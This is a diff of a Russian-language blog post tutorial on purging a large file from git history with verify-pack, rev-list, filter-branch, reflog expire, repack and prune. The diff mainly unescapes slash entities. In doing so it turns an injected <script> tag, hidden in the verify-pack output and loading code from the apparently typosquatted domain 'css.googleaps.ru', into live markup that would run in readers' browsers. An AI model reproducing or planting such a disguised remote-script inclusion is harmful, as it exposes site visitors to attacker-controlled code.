@@ -13,7 +13,7 @@ author_email: maxycws@gmail.com
 excerpt: Бывали ли у вас ситуации, когда случайно сами или кто-то из ваших коллег
   добавлял в git большие файлы, например бекап сайта или дамп sql. Удалить мы его
   конечно удалим, но информация о нем все равно будет храниться в гите и таскаться
-  &#47; загружаться каждый новый git clone.
+  / загружаться каждый новый git clone.
 wordpress_id: 218
 wordpress_url: http://devdocs.ru/?p=218
 date: '2014-12-12 16:10:08 +0200'
@@ -26,14 +26,14 @@ tags:
 - rewrite
 comments: []
 ---
-<p>Бывали ли у вас ситуации, когда случайно сами или кто-то из ваших коллег добавлял в git большие файлы, например бекап сайта или дамп sql. Удалить мы его конечно удалим, но информация о нем все равно будет храниться в гите и таскаться &#47; загружаться каждый новый git clone.<a id="more"></a><a id="more-218"></a></p>
+<p>Бывали ли у вас ситуации, когда случайно сами или кто-то из ваших коллег добавлял в git большие файлы, например бекап сайта или дамп sql. Удалить мы его конечно удалим, но информация о нем все равно будет храниться в гите и таскаться / загружаться каждый новый git clone.<a id="more"></a><a id="more-218"></a></p>
 <p>Для начала, потребовалось установить, что же это был за файл, собираем мусор в бд:</p>
 <pre class="brush: bash; gutter: true">git gc</p>
 <p>Counting objects: 457, done.<br />
 Delta compression using 2 threads.<br />
-Compressing objects: 100% (457&#47;457), done.<br />
-Writing objects: 100% (457&#47;457), done.<br />
-Total 457 (delta 250), reused 0 (delta 0)<&#47;pre></p>
+Compressing objects: 100% (457/457), done.<br />
+Writing objects: 100% (457/457), done.<br />
+Total 457 (delta 250), reused 0 (delta 0)</pre></p>
 <p>Чтобы быстро узнать, сколько у нас занято места, можно воспользоваться командой count-objects:</p>
 <pre class="brush: bash; gutter: true">git count-objects -v</p>
 <p>count: 20<br />
@@ -42,35 +42,35 @@ in-pack: 4411<br />
 packs: 1<br />
 size-pack: 2716918<br />
 prune-packable: 0<br />
-garbage: 0<&#47;pre></p>
-<p>Запись <strong>size-pack<&#47;strong> &mdash; это размер упакованных файлов в килобайтах.</p>
+garbage: 0</pre></p>
+<p>Запись <strong>size-pack</strong> &mdash; это размер упакованных файлов в килобайтах.</p>
 <p>Найдём файл, который занимает много места. При вызове git gc все объекты упаковываются в один файл, но, несмотря на это, определить самые крупные файлы можно, запустив служебную команду git verify-pack, и отсортировав её вывод по третьей колонке, в которой записан размер файла. К тому же, так как нас интересуют только самые крупные файлы, оставим только последние несколько строк, направив вывод команде tail:</p>
-<pre class="brush: bash; gutter: true">git verify-pack -v .git&#47;objects&#47;pack&#47;pack-#HASH_CODE#.pack | sort -k 3 -n | tail -3</p>
+<pre class="brush: bash; gutter: true">git verify-pack -v .git/objects/pack/pack-#HASH_CODE#.pack | sort -k 3 -n | tail -3</p>
 <p>e3f094f522629ae358806b17daf78246c27c007b blob   1486 734 4667<br />
 05408d195263d853f09dca71d55116663690c27c blob   12908 3478 1189<br />
-7a9eb2fba2b1811321254ac360970fc169ba2330 blob   2056716 2056872 5401<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre></p>
+7a9eb2fba2b1811321254ac360970fc169ba2330 blob   2056716 2056872 5401<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></pre></p>
 <p>Большой объект в самом внизу. Для того чтобы узнать, что это за файл, воспользуемся командой rev-list. Если передать ей ключ --objects, то она выдаст хеши всех коммитов, а также хеши объектов и соответствующие им имена файлов. Воспользуемся этим для определения имени выбранного объекта:</p>
 <pre class="brush: bash; gutter: true">git rev-list --objects --all | grep #HASH_CODE#</p>
 <p>7a9eb2fba2b1811321254ac360970fc169ba2330 git.tbz2<br />
-<&#47;pre></p>
+</pre></p>
 <p>Теперь необходимо удалить данный файл из всех деревьев в прошлом по истории. Легко получить все коммиты, которые меняли данный файл:</p>
 <pre class="brush: bash; gutter: true">git log --pretty=oneline --branches -- git.tbz2</p>
 <p>da3f30d019005479c99eb4c3406225613985a1db oops - removed large tarball<br />
 6df764092f3e7c8f5f94cbe08ee5cf42e92a0289 added git tarball<br />
-<&#47;pre></p>
+</pre></p>
 <p>Необходимо переписать все коммиты, начиная с 6df76 для полного удаления данного файла. Для этого воспользуемся командой filter-branch:</p>
 <pre class="brush: bash; gutter: true">git filter-branch --index-filter &#039;git rm --cached --ignore-unmatch git.tbz2&#039;</p>
-<p>Rewrite 6df764092f3e7c8f5f94cbe08ee5cf42e92a0289 (1&#47;2)rm &#039;git.tbz2&#039;<br />
-Rewrite da3f30d019005479c99eb4c3406225613985a1db (2&#47;2)<br />
-Ref &#039;refs&#47;heads&#47;master&#039; was rewritten<&#47;pre></p>
-<p>Теперь наша история не содержит ссылок на данный файл. Однако, в reflog и в новом наборе ссылок, добавленном Git&rsquo;ом в .git&#47;refs&#47;original после выполнения filter-branch, ссылки на него всё ещё присутствуют. Поэтому необходимо их удалить, а потом переупаковать базу. Необходимо избавиться от всех возможных ссылок на старые коммиты перед переупаковкой:</p>
-<pre class="brush: bash; gutter: true">rm -rf .git&#47;refs&#47;original<br />
-rm -rf .git&#47;logs&#47;<&#47;pre></p>
+<p>Rewrite 6df764092f3e7c8f5f94cbe08ee5cf42e92a0289 (1/2)rm &#039;git.tbz2&#039;<br />
+Rewrite da3f30d019005479c99eb4c3406225613985a1db (2/2)<br />
+Ref &#039;refs/heads/master&#039; was rewritten</pre></p>
+<p>Теперь наша история не содержит ссылок на данный файл. Однако, в reflog и в новом наборе ссылок, добавленном Git&rsquo;ом в .git/refs/original после выполнения filter-branch, ссылки на него всё ещё присутствуют. Поэтому необходимо их удалить, а потом переупаковать базу. Необходимо избавиться от всех возможных ссылок на старые коммиты перед переупаковкой:</p>
+<pre class="brush: bash; gutter: true">rm -rf .git/refs/original<br />
+rm -rf .git/logs/</pre></p>
 <p>Делаем все не привязанные объекты истекшими по времени</p>
-<pre class="brush: bash; gutter: true">git reflog expire --all --expire=&#039;0 days&#039;<&#47;pre></p>
+<pre class="brush: bash; gutter: true">git reflog expire --all --expire=&#039;0 days&#039;</pre></p>
 <p>Проверяем на наличие не привязанных объектов</p>
-<pre class="brush: bash; gutter: true">git fsck --full --unreachable<&#47;pre></p>
+<pre class="brush: bash; gutter: true">git fsck --full --unreachable</pre></p>
 <p>Производит переупаковку с удалением не привязанных объектов</p>
-<pre class="brush: bash; gutter: true">git repack -A -d<&#47;pre></p>
+<pre class="brush: bash; gutter: true">git repack -A -d</pre></p>
 <p>И удаляем эти объекты</p>
-<pre class="brush: bash; gutter: true">git prune<&#47;pre></p>
+<pre class="brush: bash; gutter: true">git prune</pre></p>
